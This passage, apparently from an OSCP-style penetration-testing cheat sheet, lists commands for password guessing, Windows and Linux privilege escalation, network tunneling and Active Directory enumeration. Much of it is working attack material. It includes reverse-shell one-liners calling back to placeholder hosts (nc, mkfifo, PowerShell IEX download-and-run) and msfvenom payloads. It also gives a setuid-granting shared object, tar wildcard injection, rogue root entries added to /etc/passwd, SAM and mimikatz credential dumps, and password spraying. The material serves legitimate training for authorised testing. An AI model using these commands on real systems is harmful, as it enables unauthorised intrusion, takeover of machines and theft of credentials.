<code>CompanySpring24</code>, <code>Servicewinter</code>, <code>PasswordSummer25</code> Company/Service Name + Year/Suffix <code>CompanyName2024</code>, <code>ServiceName!</code>, <code>Acme123</code> Common Suffixes/Prefixes Add <code>!</code>, <code>@</code>, <code>#</code>, <code>123</code> to known words/usernames Default Credentials Always check for software/appliance defaults (<code>admin:admin</code>, <code>root:toor</code>) Simple/Common Passwords <code>password</code>, <code>welcome</code>, <code>test</code>, <code>123456</code>, <code>secret</code> Credential Reuse Try compromised credentials on other services Blank Passwords Attempt login with just the username Keyboard Patterns <code>qwerty</code>, <code>12345</code> Leetspeak Simple substitutions (<code>p@$$w0rd</code>)"},{"location":"14_password_attacks/#wordlist-generator","title":"Wordlist Generator","text":""},{"location":"14_password_attacks/#cewl","title":"Cewl","text":"<p>Create a wordlist from a website.</p> <pre><code>cewl &lt;url&gt; -w &lt;wordlist&gt;\n</code></pre>"},{"location":"14_password_attacks/#cupp","title":"Cupp","text":"<p>https://github.com/Mebus/cupp</p> <pre><code>cupp -i\n</code></pre>"},{"location":"15_windows_privesc/","title":"\ud83d\udcce Windows Privesc","text":"<p>HackTricks \ud83d\udd38 InternalAllTheThings</p>"},{"location":"15_windows_privesc/#enumeration","title":"Enumeration","text":"<pre><code># host info\nsysteminfo\nipconfig /all\nroute print\nnetstat -ano\n\n# current user info\nwhoami\nwhoami /priv\nwhoami /groups\nwhoami /all\n\n# local users info\nnet user\nnet user &lt;user&gt;\nGet-LocalUser\n# local groups info\nnet localgroup\nnet localgroup &lt;group&gt;\nGet-LocalGroup\n# get members\nGet-LocalGroupMember &lt;group&gt;\n\n# installed apps (32-bit and 64-bit)\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n\n# running process\nGet-Process\nGet-Process | Select-Object Name, Id, Path\n\n# get .NET version\nGet-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -Recurse\n</code></pre>"},{"location":"15_windows_privesc/#interesting-files","title":"Interesting Files","text":"<pre><code># search for files recursively and alternate data streams\ndir /r /s &lt;name&gt;.txt\n\n# search for password manager dbs\nGet-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\n\n# search for config files in XAMPP\nGet-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue\n\n# search for docs in a user home directory\nGet-ChildItem -Path C:\\Users\\ -Include *.txt,*.xml,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue\n# search in hidden directories too (-Force)\nGet-ChildItem -Path C:\\Users\\ -Include *.txt, *.xml -File -Recurse -Force -ErrorAction SilentlyContinue\n\n# search for passwords in all files\nGet-ChildItem -Path C:\\ -Recurse -File -Force -ErrorAction SilentlyContinue | Select-String -Pattern \"password\" -ErrorAction SilentlyContinue\n# search for passwords in specific file types\nGet-ChildItem -Path C:\\ -Recurse -File -Force -Include \"*.txt\",\"*.config\",\"*.json\" -ErrorAction SilentlyContinue | Select-String -Pattern \"password\" -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"15_windows_privesc/#recycle-bin","title":"Recycle Bin","text":"<pre><code># list files in recycle bin\n(New-Object -ComObject Shell.Application).NameSpace(0x0a).Items()\n\n# save path to file\n$pathFile = (New-Object -ComObject Shell.Application).Namespace(0x0a).Items() | Select -ExpandProperty Path\n\n# copy all files\ncp $pathFile .\n</code></pre>"},{"location":"15_windows_privesc/#passwords","title":"Passwords","text":""},{"location":"15_windows_privesc/#powershell-history","title":"PowerShell History","text":"<pre><code># show ps history\nGet-History\n\n# get history save path\n(Get-PSReadlineOption).HistorySavePath\n</code></pre>"},{"location":"15_windows_privesc/#registry","title":"Registry","text":"<pre><code># registry can be searched for keys and values that contain the word \"password\":\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n\n# admin AutoLogon credentials:\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n</code></pre>"},{"location":"15_windows_privesc/#runas-with-saved-credentials","title":"Runas with saved credentials","text":"<pre><code># show stored credentials\ncmdkey /list\n\n# transfer a reverse shell and execute it with the credentials or directly with PS\nrunas /savecred /user:admin reverse.exe\nrunas /savecred /user:admin \"powershell -c IEX (New-Object Net.WebClient).DownloadString('http://&lt;ip&gt;/rshell.ps1')\"\n</code></pre>"},{"location":"15_windows_privesc/#runascs","title":"RunasCs","text":"<p>Useful for executing commands as another user with explicit credentials when you can't access them in any other way.</p> <p>https://github.com/antonioCoco/RunasCs</p> <pre><code>Import-Module .\\\nInvoke-RunasCs &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;\n# rev shell\nInvoke-RunasCs &lt;user&gt; &lt;pass&gt; powershell.exe -Remote &lt;ip&gt;:&lt;port&gt;\n</code></pre>"},{"location":"15_windows_privesc/#sam-and-system","title":"SAM and SYSTEM","text":"<p>Info</p> <p>\ud83d\udc08\u200d\u2b1b Hashcat mode -&gt; 1000</p> <p>Find them</p> <pre><code># search in the current path\ndir /s SAM\ndir /s SYSTEM\nGet-ChildItem -Filter \"SAM\" -Recurse -ErrorAction SilentlyContinue\nGet-ChildItem -Filter \"SYSTEM\" -Recurse -ErrorAction SilentlyContinue\n\n# possible locations\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n\nC:\\windows.old\n</code></pre> <p>Get the hash</p> <pre><code># use pypykatz\npypykatz registry --sam sam system\n\n# or secretsdump\nimpacket-secretsdump -system SYSTEM -sam SAM local # always mention 'local' in the command\n</code></pre>"},{"location":"15_windows_privesc/#dumping-local-hashes","title":"Dumping Local Hashes","text":"<p>Info</p> <p>Requires SYSTEM privileges</p> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::sam\n\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\n\nimpacket-secretsdump administrator@&lt;target_ip&gt;\n</code></pre>"},{"location":"15_windows_privesc/#automated-scripts","title":"Automated Scripts","text":"<p>winPEASany.exe</p> <p>PowerUp.ps1</p> <p>SharpUp.exe</p> <p>Seatbelt.exe</p> <pre><code>.\\winPEASany.exe\n\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n</code></pre>"},{"location":"15_windows_privesc/#services","title":"Services","text":""},{"location":"15_windows_privesc/#binary-hijacking","title":"Binary Hijacking","text":"<pre><code># query running processes\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n# or in winpeas look for a service\nYOU CAN MODIFY THIS SERVICE: AllAccess\nFile Permissions: Users [WriteData/CreateFiles]\n\n# check permissions (F for full access)\nicacls \"&lt;path&gt;\"\n\n# replace the service binary with a reverse shell or change the binpath to it\nsc config &lt;svc_name&gt; binpath=\"&lt;rshell_path&gt;\"\nsc stop &lt;svc_name&gt;\nsc start &lt;svc_name&gt;\n</code></pre>"},{"location":"15_windows_privesc/#unquoted-service-paths","title":"Unquoted Service Paths","text":"<pre><code># list running and stopped services\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName\n# or cmd\nwmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\"\n\n# using icacls check all parts of the path\n# upload a malicious file to the path, for example, if the user can write to the 'Current Version' folder:\nC:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe\n\n# upload the malicious file to that folder, naming it 'current.exe'\n# start the service\nsc start &lt;svc_name&gt;\n</code></pre>"},{"location":"15_windows_privesc/#insecure-service-executables","title":"Insecure Service Executables","text":"<pre><code># in winpeas look for a service which has the following\nFile Permissions: Everyone [AllAccess]\n\n# replace the executable with a malicious file and start the service\nsc start &lt;service&gt;\n</code></pre>"},{"location":"15_windows_privesc/#weak-registry-permissions","title":"Weak Registry Permissions","text":"<pre><code># in Winpeas look for a service which has the following\nHKLM\\system\\currentcontrolset\\services\\&lt;service&gt; (Interactive [FullControl])\n\n# check for KEY_ALL_ACCESS\naccesschk /acceptula -uvwqk &lt;path of registry&gt; \n\n# Service Information from regedit, identify the variable that holds the executable path\nreg query &lt;reg-path&gt;\n\n# ImagePath is the variable here\nreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f\n\nsc start &lt;service&gt;\n</code></pre>"},{"location":"15_windows_privesc/#dll-hijacking","title":"DLL Hijacking","text":"<pre><code># list apps\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n\n# check if folder is writable\necho \"test\" &gt; 'C:\\FileZilla\\FileZilla FTP Client\\test.txt'\ntype 'C:\\FileZilla\\FileZilla FTP Client\\test.txt'\n</code></pre> <p>Using Process Monitor, identify all DLLs loaded by the selected app as well as detect missing ones, and try to replace one with a malicious file.</p> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;attack_box&gt; LPORT=&lt;lport&gt; -f dll -o reverse.dll\n</code></pre> <p>Transfer the malicious DLL to the path and restart the service.</p> <pre><code>sc stop &lt;service&gt;\nsc start &lt;service&gt;\n</code></pre>"},{"location":"15_windows_privesc/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code># list tasks\nschtasks /query /fo LIST /v\nGet-ScheduledTask | Select-Object TaskName, TaskPath, State\n\n# use icacls in the path to check permissions\nicacls &lt;path&gt;\n\n# upload the malicious file and wait for execution\n</code></pre>"},{"location":"15_windows_privesc/#startup-apps","title":"Startup Apps","text":"<p>Info</p> <p>For this to work, the system needs to be restarted</p> <pre><code># startup applications can be found here\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp \n\n# check if the folder is writable and transfer a reverse shell to it, then reboot the system\nshutdown /r /t 0\n</code></pre>"},{"location":"15_windows_privesc/#insecure-gui-apps","title":"Insecure GUI Apps","text":"<pre><code># check the privileged applications that are running from \"TaskManager\"\n# open one of them, and from the file menu click 'Open' and enter the following:\nfile://c:/windows/system32/cmd.exe\n</code></pre>"},{"location":"15_windows_privesc/#public-exploits-and-security-updates","title":"Public Exploits and Security Updates","text":"<p>https://github.com/bitsadmin/wesng</p> <p>https://github.com/SecWiki/windows-kernel-exploits</p> <pre><code># enumerate the system\nsysteminfo\nwmic qfe list\nGet-HotFix | Sort-Object -Property InstalledOn -Descending\nGet-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq \"Security Update\" }\nsysteminfo | findstr /B /C:\"KB\"\n\n# find a public exploit\nsearchsploit 'params'\n\n# Windows Exploit Suggester ng\npipx install wesng\nwes --update\nwes sysinfo # copied from the windows host\nwes sysinfo -e # show only vulns with exploits\n\n# search in the above repo for usable exploits\n</code></pre>"},{"location":"15_windows_privesc/#registry_1","title":"Registry","text":""},{"location":"15_windows_privesc/#autorun","title":"Autorun","text":"<pre><code># query the registry for executables\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# check if the location is writable\naccesschk.exe /accepteula -wvu \"&lt;path&gt;\" # returns FILE_ALL_ACCESS\n\n# replace the executable with the reverse shell and wait for the Admin to log in\n</code></pre>"},{"location":"15_windows_privesc/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<p>Tip</p> <p>Check policy if file is not being executed: <code>Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections</code></p> <pre><code># query the registry for keys, it should return 1 or 0x1\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# create a reverse shell in MSI format\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; --platform windows -f msi -o rshell.msi\n\n# run the installer to trigger the shell\nmsiexec /quiet /qn /i rshell.msi\n</code></pre>"},{"location":"15_windows_privesc/#privileges","title":"Privileges","text":"<pre><code>whoami /priv\n</code></pre>"},{"location":"15_windows_privesc/#seimpersonateprivilege","title":"SeImpersonatePrivilege","text":"<p>https://github.com/BeichenDream/GodPotato</p> <p>https://github.com/antonioCoco/JuicyPotatoNG</p> <p>https://github.com/ohpe/juicy-potato/tree/master/CLSID</p> <p>https://github.com/itm4n/PrintSpoofer</p> <pre><code># GodPotato\nGodPotato.exe -cmd \"cmd /c whoami\"\nGodPotato.exe -cmd \"shell.exe\"\n\n# get .NET version\nGet-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -Recurse\n\n# JuicyPotatoNG\nJuicyPotatoNG.exe -t * -p \"shell.exe\" -a\nJuicyPotatoNG.exe -t * -p \"cmd.exe\" -a \"/c nc.exe &lt;ip&gt; &lt;port&gt; -e cmd\"\n# find available ports\nJuicyPotatoNG.exe -s\n\n# PrintSpoofer\nPrintSpoofer.exe -i -c powershell.exe\nPrintSpoofer.exe -c \"nc.exe &lt;lhost&gt; &lt;lport&gt; -e cmd\"\n</code></pre>"},{"location":"15_windows_privesc/#sebackupprivilege","title":"SeBackupPrivilege","text":"<pre><code># using robocopy, extract data from forbidden folders\nrobocopy /b c:\\users\\enterpriseadmin\\desktop . * \n\n# or\n\n# get sam and system\nreg save hklm\\sam .\\sam\nreg save hklm\\system .\\system     \n\n# use pypykatz to get user hashes and PTH or hashcat with -m 1000 to get passwords\npypykatz registry --sam sam system\n\n# or secretsdump\nimpacket-secretsdump -system SYSTEM -sam SAM local # always mention local in the command\n</code></pre>"},{"location":"15_windows_privesc/#semanagevolumeprivilege","title":"SeManageVolumePrivilege","text":"<p>https://github.com/CsEnox/SeManageVolumeExploit</p>"},{"location":"15_windows_privesc/#pass-the-hash","title":"Pass the Hash","text":"<p>Info</p> <p>Remember that the full hash includes both the LM and NTLM hash, separated by a colon.</p> <pre><code>pth-winexe -U 'administrator%hash' //10.10.56.135 cmd.exe\n</code></pre>"},{"location":"16_linux_privesc/","title":"\ud83d\udc27 Linux Privesc","text":"<p>HackTricks \ud83d\udd38 InternalAllTheThings</p>"},{"location":"16_linux_privesc/#enumeration","title":"Enumeration","text":"<pre><code># user\nid\nwhoami\n\n# system\nhostname\n\n# net\nifconfig\nip a\nip route\nroute\nroutel\nsudo tcpdump -i lo -A | grep \"pass\"\n\n# connections\nss -ntplu\nnetstat -ntplu\n\n# users\ncat /etc/passwd\n\n# OS info\ncat /etc/issue\ncat /etc/*release\nuname -a\n\n# processes\nps aux\n# wide\nps auxww\n# tree\nps axjf\n\n# installed apps on system (debian-based)\ndpkg -l\n\n# find writable paths\nfind / -writable -type d 2&gt;/dev/null\n\n# list drives mounted at boot time \ncat /etc/fstab\nmount\nlsblk # show available disks\n\n# list loaded kernel modules and get specific info to find an exploit\nlsmod\n/sbin/modinfo &lt;module&gt;\n</code></pre> <p>Tip</p> <p>\ud83c\udf6a Try to switch users using username as pass</p>"},{"location":"16_linux_privesc/#user-trails","title":"User trails","text":"<pre><code># env vars\nenv\n# .bashrc config\ncat .bashrc\nwatch -n 1 \"ps -aux | grep pass\"\n</code></pre>"},{"location":"16_linux_privesc/#interesting-files","title":"Interesting Files","text":"<pre><code># check history\nhistory\ncat ~/.*history | less\n\n# config files\nfind /home/&lt;user&gt; -type f \\( -name \"*.txt\" -o -name \"*.conf\" -o -name \"*.ini\" \\) 2&gt;/dev/null\n\n# .ssh folder\nfind /home/&lt;user&gt; -type d -name \".ssh\" 2&gt;/dev/null\n\n# kdbx files\nfind / -name \"*.kdbx\" 2&gt;/dev/null\n</code></pre>"},{"location":"16_linux_privesc/#cron-jobs","title":"Cron jobs","text":"<p>Tip</p> <p>\ud83c\udf6a Examine periodic processes with pspy</p> <pre><code>ls -lah /etc/cron*\n# current user's jobs\ncrontab -l\n# root user's jobs\nsudo crontab -l\n\n# inspect cron logs\ngrep \"CRON\" /var/log/syslog\n\n# reverse shell to cron file\necho \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; &lt;port&gt; &gt; /tmp/f\" &gt;&gt; scripts/user_backups.sh \n</code></pre>"},{"location":"16_linux_privesc/#suidsgidsudocaps","title":"SUID/SGID/Sudo/Caps","text":"<p>Tip</p> <p>\ud83c\udf6a Check GTFOBins for escaping the programs</p> <pre><code># find programs and groups with bit\nfind / -perm -u=s -type f 2&gt;/dev/null\nfind / -perm -g=s -type f 2&gt;/dev/null\n\n# list capabilities\n/usr/sbin/getcap -r / 2&gt;/dev/null\n\n# check sudo privs\nsudo -l\n</code></pre>"},{"location":"16_linux_privesc/#path-hijacking","title":"Path Hijacking","text":"<p>A SUID executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.</p> <p>Run <code>strings</code> on the file to look for strings of printable characters or <code>ltrace</code> to look for system calls.</p> <pre><code>strings &lt;suidexecutable&gt;\n</code></pre> <p>One line (<code>apache2</code>) suggests that the service executable is being called to start the webserver, however the full path of the executable (<code>/usr/sbin/service</code>) is not being used.</p> <p>Create a malicious file in a writable path and call it like the file the SUID executable calls.</p> <pre><code>echo '/bin/bash -p' &gt; /tmp/apache2\n</code></pre> <p>Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the\u00a0suid\u00a0executable to gain a root shell:</p> <pre><code>export PATH=/tmp:$PATH\n\napache2\n</code></pre>"},{"location":"16_linux_privesc/#shared-object-injection","title":"Shared Object Injection","text":"<p>A SUID executable can be vulnerable to shared object injection.</p> <p>First, execute the file and notice the missing object error.</p> <p>If there is no feedback, run <code>strace</code> on the file and search the output for open/access calls and for no such file errors:</p> <pre><code>strace suid-so 2&gt;&amp;1 | grep -iE \"open|access|no such file\"\n</code></pre> <p>Note that the executable tries to load the <code>.config/libcalc.so</code> shared object within the home directory, but it cannot be found. Create the .config directory for the <code>libcalc.so</code> file: <code>mkdir .config</code></p> <p>After knowing the path, compile a malicious code into a shared object at the location the suid-so executable is looking for:</p> <pre><code>#include &lt;stdlib.h&gt;\n\n__attribute__((constructor)) void make_setuid() {\n    system(\"chmod +s /bin/bash\");\n}\n</code></pre> <pre><code>gcc -shared -fPIC libcalc.c -o libcalc.so\u00a0\n</code></pre> <p>Execute <code>/bin/bash -p</code> to gain a root shell.</p> <pre><code>/bin/bash -p\n</code></pre>"},{"location":"16_linux_privesc/#weak-file-permissions","title":"Weak file permissions","text":"<p>Info</p> <p>\ud83d\udc08\u200d\u2b1b Hashcat mode -&gt; 1800</p> <pre><code># check if /etc/shadow can be read and combine it with /etc/passwd to crack it\nunshadow passwd shadow &gt; passwords.txt\njohn --wordlist=&lt;wordlist&gt; passwords.txt\n\n# check if /etc/shadow is writable and put a new root hash\nmkpasswd -m sha-512 &lt;newpassword&gt;\nopenssl passwd -6 &lt;newpassword&gt;\n\n# check if /etc/passwd is writable and put a new root hash\nopenssl passwd &lt;newpassword&gt;\necho \"root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd\n</code></pre>"},{"location":"16_linux_privesc/#kernel-exploits","title":"Kernel exploits","text":"<pre><code>cat /etc/issue\nuname -r\narch\n\n# find a public exploit\nsearchsploit &lt;name&gt;\n</code></pre>"},{"location":"16_linux_privesc/#automated-scripts","title":"Automated Scripts","text":"<p>linPEAS.sh</p> <p>Linux Exploit Suggester 2</p>"},{"location":"16_linux_privesc/#nfs","title":"NFS","text":"<pre><code># mountable shares\ncat /etc/exports\nshowmount -e &lt;ip&gt;\n\n# mount a share\nmkdir /tmp/share\nmount -o rw &lt;ip&gt;:&lt;share&gt; /tmp/share\n\n# using Kali's root user, generate a payload and save it to the mounted share\n# using Kali's root user, make the file executable and set the SUID permission:\nchmod +xs share/shell.elf\n\n# on the victim, as the low privileged user, execute the file to gain a root shell:\n/&lt;share_path&gt;/shell.elf\n</code></pre>"},{"location":"16_linux_privesc/#tar-wildcard","title":"Tar Wildcard","text":"<p>A script that uses tar with a wildcard ( * ) is vulnerable to arbitrary command execution via maliciously crafted checkpoint files in the target directory.</p> <pre><code>echo -n 'chmod +s /bin/bash' | base64\n&gt; Y2htb2QgK3MgL2Jpbi9iYXNo\n\ntouch -- \"--checkpoint=1\"\ntouch -- '--checkpoint-action=exec=\"echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash\"'\n</code></pre>"},{"location":"17_port_red_tun/","title":"\ud83d\udea2 Port Redirection and Tunneling","text":""},{"location":"17_port_red_tun/#ping-sweep","title":"Ping Sweep","text":"<pre><code># Linux\nnmap -v -sn x.x.x.1-253\nnmap -sn x.x.x.0/24\n\nfor i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done\nfor ip in 192.168.1.{1..254}; do ping -c1 -W1 $ip &amp;&gt;/dev/null &amp;&amp; echo \"$ip is up\"; done\nfping -a -g 192.168.1.1 192.168.1.254 2&gt;/dev/null\n\n# Windows CMD\nfor /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find \"Reply\"\n# Windows PowerShell\n1..254 | % {\"172.16.6.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.6.$($_) -Quiet)\"}\n</code></pre>"},{"location":"17_port_red_tun/#port-redirection","title":"Port Redirection","text":""},{"location":"17_port_red_tun/#socat","title":"Socat","text":"<pre><code>socat TCP-LISTEN:&lt;local_port&gt;,fork TCP:&lt;ip&gt;:&lt;port&gt;\n</code></pre>"},{"location":"17_port_red_tun/#port-forwarding","title":"Port Forwarding","text":""},{"location":"17_port_red_tun/#ssh-local-port-forwarding","title":"SSH Local Port Forwarding","text":"<pre><code># forwards local machine port 8080 to a remote machine's port 80\nssh -L 8080:localhost:80 user@ssh_server\n</code></pre>"},{"location":"17_port_red_tun/#ssh-remote-port-forwarding","title":"SSH Remote Port Forwarding","text":"<pre><code># forwards a remote machine's port 80 to the local machine's port 9090\nssh -R 127.0.0.1:9090:&lt;target&gt;:80 user@kali_machine\n</code></pre>"},{"location":"17_port_red_tun/#chisel","title":"Chisel","text":"<pre><code># create server \nchisel server --port 8080 --reverse\n\n# create client on remote machine\nchisel client &lt;local_host&gt;:8080 R:&lt;local_port&gt;:localhost:&lt;remote_port&gt;\n</code></pre>"},{"location":"17_port_red_tun/#tunneling","title":"Tunneling","text":""},{"location":"17_port_red_tun/#ligolo","title":"Ligolo","text":"<p>https://github.com/nicocha30/ligolo-ng/releases</p> <pre><code># create ligolo interface\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n\n# start the proxy on attacker machine\n./li-proxy -selfcert -laddr 0.0.0.0:443\n\n# upload the agent to the target machine and start it\n./li-agent -connect &lt;attacker_ip&gt;:443 -ignore-cert\nagent.exe -connect &lt;attacker_ip&gt;:443 -ignore-cert\n\n# the connection will be displayed in the proxy\nsession # choose the session\nifconfig # show subnets of the agent\n# add the subnet to the routing table\nsudo ip route add &lt;subnet&gt; dev ligolo\n# back in ligolo, start it\nstart\n</code></pre>"},{"location":"17_port_red_tun/#chisel_1","title":"Chisel","text":"<pre><code># create server \nchisel server --port 8080 --reverse --socks5\n\n# create client on remote machine\nchisel client &lt;local_host&gt;:8080 R:socks\n\n# add the port assigned by chisel to /etc/proxychains.conf\n# use proxychains to interact with the internal network \nsudo proxychains &lt;command&gt;\n\n# create a client and add extra port forwarding (useful to access a web page from a browser)\n./chisel client &lt;local_host&gt;:8080 R:socks R:4545:localhost:80\n</code></pre>"},{"location":"17_port_red_tun/#ssh-dynamic-port-forwarding","title":"SSH Dynamic Port Forwarding","text":"<pre><code># creates a dynamic tunnel between local host and target\nssh -D 9050 user@10.4.213.215\n\n# add port to /etc/proxychains4.conf\nsocks5 127.0.0.1 9050\n\n# use proxychains to interact with the internal network \nsudo proxychains &lt;command&gt;\n</code></pre>"},{"location":"17_port_red_tun/#dns-tunneling","title":"DNS Tunneling","text":"<pre><code>dnscat2-server feline.corp\n\n# from the victim machine\ndnscat feline.corp\n\n# from the server\nwindows -i &lt;id&gt;\n? for help\n</code></pre>"},{"location":"17_port_red_tun/#sshuttle","title":"Sshuttle","text":"<pre><code># creates a VPN-like tunnel between networks\nsshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24\n</code></pre>"},{"location":"17_port_red_tun/#windows-tools","title":"Windows Tools","text":""},{"location":"17_port_red_tun/#sshexe","title":"ssh.exe","text":"<pre><code># creates a dynamic reverse tunnel between the current host and the attack host\nssh -N -R 9998 kali@192.168.45.171\n\n# configure proxychains in /etc/proxychains4.conf\nsocks5 127.0.0.1 9998\n\n# use proxychains to interact with \nsudo proxychains &lt;command&gt; &lt;ip&gt;\n</code></pre>"},{"location":"17_port_red_tun/#plink","title":"Plink","text":"<pre><code># creates an SSH tunnel from a local port to a remote service\nC:\\Windows\\Temp\\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4\n</code></pre>"},{"location":"17_port_red_tun/#netsh","title":"Netsh","text":"<pre><code>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215\n\n# show active interfaces\nnetsh interface portproxy show all\n</code></pre>"},{"location":"18_ad_enum/","title":"\ud83d\udd2d AD Enumeration","text":""},{"location":"18_ad_enum/#capturing-ntlmv2-hashes","title":"Capturing NTLMv2 Hashes","text":"<p>Info</p> <p>\ud83d\udc08\u200d\u2b1b Hashcat mode -&gt; 5600</p> <p>Poisoning and Spoofing is not allowed on the OSCP exam</p> <p>https://github.com/Kevin-Robertson/Inveigh</p> <pre><code># responder\nsudo responder -I eth0\n\n# SMB server\nimpacket-smbserver -smb2support &lt;sharename&gt; $(pwd)\n\n# Windows privileged\ninveigh.exe -httpd &lt;ip&gt;\n</code></pre>"},{"location":"18_ad_enum/#unc-attack","title":"UNC Attack","text":"<pre><code># from inside the machine (shortcut file, shell or web attack)\ndir \\\\&lt;IP&gt;\\test\nContent-Disposition: form-data; name=\"myFile\"; filename=\"\\\\\\\\&lt;ip&gt;\\\\test\"\ncurl http://&lt;url&gt;/index.php?view=//10.10.14.13/asdf\n</code></pre>"},{"location":"18_ad_enum/#domain-enumeration","title":"Domain Enumeration","text":"<pre><code># rpcclient\nquerydominfo\n\nenum4linux-ng -a &lt;ip&gt;\n</code></pre>"},{"location":"18_ad_enum/#password-spraying","title":"Password Spraying","text":"<p>https://github.com/ropnop/kerbrute</p> <pre><code># nxc or cme\nnxc smb &lt;ip&gt; -u users.txt -p &lt;password&gt; -d &lt;domain&gt; --continue-on-success\n\n# kerbrute\nkerbrute passwordspray -d &lt;domain&gt; users.txt &lt;password&gt; --dc &lt;dc_ip&gt;\n</code></pre>"},{"location":"18_ad_enum/#password-policy","title":"Password Policy","text":"<pre><code># rpcclient\ngetdompwinfo\n\n# nxc\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --pass-pol\n\n# ldap\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\\\\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n\n# from Windows\nnet accounts\nGet-DomainPolicy\n</code></pre>"},{"location":"18_ad_enum/#user-enumeration","title":"User Enumeration","text":"<p>https://github.com/lkarlslund/ldapnomnom</p> <p>https://github.com/ropnop/kerbrute</p> <pre><code>#rpcclient\nenumdomusers\n\n# via Kerberos\nkerbrute enumusers --dc &lt;ip&gt; -d &lt;domain&gt; &lt;userlist&gt;\n\n# ldap\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=user)\"\nldapnomnom -dnsdomain &lt;domain&gt; -server &lt;dc-ip&gt; -input &lt;wordlist&gt;\n\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --users\n\nenum4linux-ng -a &lt;ip&gt;\n\n# Windows\n.\\Rubeus.exe brute /users:&lt;userlist&gt; /passwords:&lt;wordlist&gt; /domain:&lt;domain&gt;\n</code></pre>"},{"location":"18_ad_enum/#validating-credentials","title":"Validating Credentials","text":"<p>Tip</p> <p>\ud83c\udf6a NetExec</p> <ul> <li><code>[+]</code> is valid credentials</li> <li><code>[pwned!]</code> is valid credential with privileges</li> </ul> <p>Tip</p> <p>\ud83c\udf6a Some users could have their username as their password</p> <pre><code>nxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;\n# local accounts\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --local-auth\n\n# check in a range of machines\nnxc smb x.x.x.70-76 -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --continue-on-success\n\n# with a userlist and wordlist\nnxc smb &lt;ip&gt; -u &lt;userlist&gt; -p &lt;wordlist&gt; -d &lt;domain&gt; --continue-on-success\n\n# enumerate users by rid\nnxc smb &lt;ip&gt; -u 'guest' -p '' --rid-brute\n\n# kerbrute\nkerbrute brute -d &lt;domain&gt; -u &lt;user&gt; -p 